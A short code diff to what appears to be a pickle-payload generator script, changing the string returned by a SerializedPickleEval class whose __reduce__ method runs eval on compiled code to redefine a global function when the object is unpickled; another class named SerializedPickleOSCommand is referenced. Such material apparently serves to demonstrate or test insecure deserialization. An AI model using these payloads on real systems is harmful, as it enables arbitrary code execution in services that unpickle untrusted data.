@@ -9,7 +9,7 @@ class SerializedPickleOSCommand(object):
 
 class SerializedPickleEval(object):
     def __reduce__(self):
-        return(__builtins__.eval,('eval(compile("""global finished\ndef finished():\n    return \'hacked\'""", \'<stdin>\', \'exec\'))',))
+        return(__builtins__.eval,('eval(compile("""global finished\ndef finished():\n    return \'Modified this function!\'""", \'<stdin>\', \'exec\'))',))
 
 if len(sys.argv) < 2:
     print("Usage: ./generate_pickle.py #")
